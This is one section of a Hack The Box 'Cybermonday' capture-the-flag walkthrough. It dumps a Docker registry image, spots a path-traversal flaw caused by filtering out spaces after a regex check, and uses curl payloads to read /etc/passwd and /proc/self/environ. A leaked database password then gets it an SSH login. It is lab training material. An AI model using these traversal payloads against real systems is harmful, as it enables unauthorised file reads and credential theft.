# Reading the Source

[Initial Enumeration](/writeups/machines/htb-cybermonday/1-initial-enumeration)
[Webhook API Admin Access](/writeups/machines/htb-cybermonday/2-webhook-api-admin)
[Obtaining More Info](/writeups/machines/htb-cybermonday/3-obtaining-more-info)
[Gaining a Foothold](/writeups/machines/htb-cybermonday/4-gaining-a-foothold)
[Where to Now?](/writeups/machines/htb-cybermonday/5-where-to-now)
**[Reading the Source](/writeups/machines/htb-cybermonday/6-reading-the-source)**
[Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)

Now that we have access to an internal Docker registry, let's use `curl` to see if we can get a list of images the registry contains.
```bash
curl http://<registry ip>:5000/v2/_catalog

{"repositories":["cybermonday_api"]}
```

It looks like this registry holds the image for the webhook API. We can download this image to look through the source and see if we can spot any vulnerabilities to exploit. While we could configure our local Docker version to use the `SOCKS` proxy and download the image that way, since we're not looking to actually run the container it's probably easier to download [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) and get the image that way.
```bash
proxychains python3 DockerGraber.py http://<registry ip> --dump cybermonday_api

[+] BlobSum found 27
[+] Dumping cybermonday_api
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d6...
```

Once we have all the blobs we can extract them all with:
```bash
for f in *.tar.gz; do tar xf "$f"; done
```

And now we have the filesystem for the `cybermonday_api` container. The source for the webhook API can be found in `/var/www/html`. Looking through this source code, we see there's an undocumented endpoint for `createLogFile` type webhooks that lets us list and read the logs that are created. It also requires a different type of authentication to the token we've been using. Let's run the `list` action on the original webhook we found in the changelog.
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs \
-H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" \
-H "Content-Type: application/json" \
-d '{"action": "list"}'

{"status":"success","message":[...]}
```

If you made any requests to create a log earlier, you'll see them listed here. Next we want to test the read function.
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs \
-H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" \
-H "Content-Type: application/json" \
-d '{"action": "read", "log_name": "test-<timestamp>.log"}'

{"status":"success","message":"test"}
```

Okay so we get the basic idea, you create logs with the webhook then read them here. The read log function checks for path traversal with a `regex` pattern and makes sure the file has `log` in the name. But if you look closer you might spot a problem. Theres a string substitution made _after_ the `regex` check.
```php
preg_match("/\.\.\//", $logName)
str_replace(' ', '', $logName)
```

Which means we can still abuse this endpoint for path traversal. We need to also be sure to include `log` in the name, but for that we can just re-enter the `/logs` directory and back out again. So a request to fetch `/etc/passwd` would look like this:
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs \
-H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" \
-H "Content-Type: application/json" \
-d '{"action": "read", "log_name": ". ./. ./logs/. ./etc/passwd"}'

{"status":"success","message":"root:x:0:0:root:\/root:\/bi..."}
```

Now we have path traversal, but what can we do with it? The code uses `file_get_contents` rather than `include` so we can't inject any code. We could try and see if another `.env` file exists.
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs \
-H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" \
-H "Content-Type: application/json" \
-d '{"action": "read", "log_name": ". ./. ./logs/. ./var/www/html/.env"}'

{"status":"error","message":"This log does not exist"}
```

No luck. But there is one file we can request the might be useful. Linux has a number of virtual directories in `/proc` that let you get the state of different processes. For the [[php|PHP]] server itself we can use `/proc/self`, and in particular `/proc/self/environ`.
```bash
curl http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs \
-H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" \
-H "Content-Type: application/json" \
-d '{"action": "read", "log_name": ". ./. ./logs/. ./proc/self/environ"}'

{"status":"success","message":"HOSTNAME=e1862f4e1242\u0000PHP..."}
```

This gives us the environment variables set for the PHP server process. If we look carefully, we see one variable that might be of use.
```bash
DBPASS=ngFfX2L71Nu
```

It's pretty buried in there and can be easy to miss with the JSON formatting, but we can see a password in the environment that might just be what we're looking for. If we try to `ssh` to the host using the username we found earlier and this password:
```bash
ssh john@<host ip>
john@<host ip>'s password:

john@cybermonday:~$ 
```

Success. Grab the flag in `user.txt` and then let's continue on to root.

Next: [Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)